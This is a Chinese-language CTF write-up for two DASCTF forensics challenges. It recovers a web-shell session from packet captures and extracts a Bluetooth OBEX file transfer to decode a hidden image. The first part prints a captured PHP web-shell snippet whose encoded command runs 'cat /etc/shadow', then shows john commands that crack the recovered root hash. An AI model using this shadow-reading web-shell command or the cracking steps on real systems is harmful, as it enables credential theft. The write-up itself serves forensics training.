使用 CyberChef 进行 Base64 解码可得到 passwd 文件:

![](Screenshot_20250621_084803.webp)

保存到本地待用。

再看到 No. 52538 包解密后得到与上面传入的脚本相似，修改的内容仅为 `$cmd` 部分。为减小篇幅，相同部分不再贴出:

```php
$cmd="Y2QgL3Zhci93d3cvaHRtbC91cGxvYWRzLyA7Y2F0IC9ldGMvc2hhZG93";$cmd=base64_decode($cmd);$path="L3Zhci93d3cvaHRtbC91cGxvYWRzLw==";$path=base64_decode($path);
main($cmd,$path);
```

对 `$cmd` 进行 Base64 解码可以得到:

![](Screenshot_20250621_085322.webp)

可以看到执行了 `cat /etc/shadow`，所以预期响应包应当为 `shadow` 文件内容。

但是在 Wireshark 并不能识别到对应的响应包。

![](Screenshot_20250621_085422.webp)

可以看到 No. 52538 下一个包被标记为 `[TCP Previous segment not captured]`。

此时可以关闭 Filter 查看具体过程:

![](Screenshot_20250621_085526.webp)

可以看到被标记为 `[TCP Previous segment not captured]` 的 No. 52542 下一个包被标记位 `[TCP Out-Of-Order]`，说明此处可能因为网络原因包发生了重传。

此时可以使用 Follow TCP Stream 功能对包进行重新分析:

![](Screenshot_20250621_090120.webp)

可以获得此处服务器返回为:

```
myzZoRJB9iFwgtIPC0fDUeFaS+fdv0LH3s0SKFXJkWe+V0zA2TRsTsfK65Dn7HMfUZaD+teWivQyAjt320oY70by3v22VYG+fe9m+wVYkpscpuhYFu5u10Gk+/seD+6Swj65YvXjSJVI7fAC7wuUXCJEIo5CkJyC78gv7bCBn3Xd2TKaHp8grtoz+a9geiFFyhPYpjo1G8KFXE4zkzesi/vA5C9TF55yANHILKvybGhwNnDqBA/EK1eB9oF99hwoH/JF0g/mXYCh+8pl6UtnXMWJibavqk+vW3daw2irj4BxUp5DhiBfialxH2TkYD+PWCawQRPyySSxY/5dsQplP0uuMDuijkM7A5VRK8tzs/XV14Norr1RWEshvfBukQphvX1MZMXUTCf5Roqo9M6Sls2L5gK6z8rrnmSVNIOf8RzmAFnHOOtzbyO8wr/Fc5asNizVcPrCL9Ul3EUVy+h4p3ow2cQfaLHfs0RVs5KSJdVwHrJcgH8gdv6bUeOXkDkiboauyFdgQTbYQYCZ6pGliiwbsgmU6M9QVGcXa27BxMPLZivnrIynGGVQT+b6HnOZT/jPgyz7TbzQDJH0YNynjdHFAgFkdngph75uql2jlggVzr9/IKsAgCPZL1SK8ZdZfryMN89/mn1nq/0E1eWzKwZSym/qeCckqpFLcBUsDNpfbVkXdqyYZ5G1AYaAIp8OoUe+cEhoFnvay4/gVsn4Ol6qocOkwQ4pfv1dVWosaB2X8duzW7xTuZmUrfRLwW+ybsW3pvc/1TmlJYKLKTxWFUeiEKxrscnWz2fkIbNjRwD6rDHbQXPLk/cnB0gq7EE4JTxkePqEJq+x5oR712jHqeMLeDtqtKiJX8NHZktaykEZlVTSu0ptknM1DDijOQtiQX5a6mpJgBSDIHxOkVsG/ghCZ2DnGYQd5YM4TkQOzzn2IRczBKxG+pj3H2/tqoL3Dpbjwjh8+KGbPBvtxYE4isC2rv+iJ3OcfD/fA9u0QzZlVLAPot0HRkhQnjAprBSxC+nHMwv0oqX6/SsGoBsQjUeYQPsIbUEoXPQyfyiv8jny08uEBgfY8nMcxMrEcM54BVVFCwY4b7TfOM5dFd90bHNmStc051bJsXal/0q6Q7VI8vaUUvbnvZ+Z/2uOzHTa
```

重复前面的解密操作可以获得 `/etc/shadow` 文件内容:

![](Screenshot_20250621_090321.webp)

保存到本地。

![](Screenshot_20250621_090402.webp)

使用 `unshadow` 指令对 passwd 和 shadow 进行 unshadow 以便使用 `john` 进行爆破。

随后使用以下指令:

```shell
john --format=crypt --wordlist=~/rockyou.txt unshadowed
john --show unshadowed
```

![](Screenshot_20250621_090528.webp)

可得到 root 密码为: `slideshow`。

根据题目需求计算出密码的 MD5 值:

![](Screenshot_20250621_090632.webp)

可得 flag 为: `DASCTF{f3d279e1b58a1e25c092b018f035d406}`

### BlueTrace

使用 Wireshark 打开流量包，使用 Protocol Hierarchy Statistics 功能:

![](Screenshot_20250621_090759.webp)

不难发现 `OBEX` 协议占了整个捕获会话的绝大多数数据，经过查询可以得知 `OBEX` 协议用于蓝牙中的二进制数据交换。

找到第一个 OBEX 数据包:

![](Screenshot_20250621_091033.webp)

可以发现数据未经加密。

并且经过查看所有数据包可发现，此处只传输了一个文件，并且文件名为 `yuji.jpg`。

此处可以使用以下 `tshark` 对 OBEX 协议交换的数据内容进行导出:

```shell
tshark -r BlueTrace.pcapng -Y "obex.opcode == 0x02" -T fields -e obex.header.value.byte_sequence | xxd -r -p > yuji.jpg
```

使用 `binwalk` 发现里面有 ZIP 档案包:

![](Screenshot_20250621_091352.webp)

使用指令 `binwalk -e yuji.jpg` 可以解得以下文件:

![](Screenshot_20250621_091514.webp)

根据提示找到目标电脑名字。

在 Wireshark 应用 `obex` Filter 的时候可以看到 Destination 为 `INFERNITY???PC`，此处存在协议中不支持的字符。

![](Screenshot_20250621_091849.webp)

使用以下指令对数据包进行搜寻可以得到电脑的实际名字:

```shell
strings /home/ricky/ctf/workdir/dasctf-2025/BlueTrace/BlueTrace.pcapng --unicode=escape | grep -i INFERNITY
```

![](Screenshot_20250621_092456.webp)

![](Screenshot_20250621_092613.webp)

可以得知电脑名字为: `INFERNITYのPC`

使用该密码可解压出 `flag.png` 文件:

![](BlueTrace_flag.png)

不难猜测这是一张灰度图，并结合 Pillow 可分析出来每个像素的 RGB 值 R, G, B 三个值是相等的:

![](Screenshot_20250621_093132.webp)

可以编写出以下脚本提取灰度值:

```python
from PIL import Image

flag = Image.open("flag.webp")
b = bytearray()

for y in range(flag.size[1]):
    for x in range(flag.size[0]):
        b.append(flag.getpixel((x, y))[0])

with open("flag.bin", "wb") as fp:
    fp.write(b)
```

打开提取出来的 `flag.bin` 文件:

![](Screenshot_20250621_093305.webp)

可发现 flag 便在文本中间。

可以得到 flag 为: `DASCTF{0ba687ee-60e0-4697-8f4c-42e9b81d2dc6}`
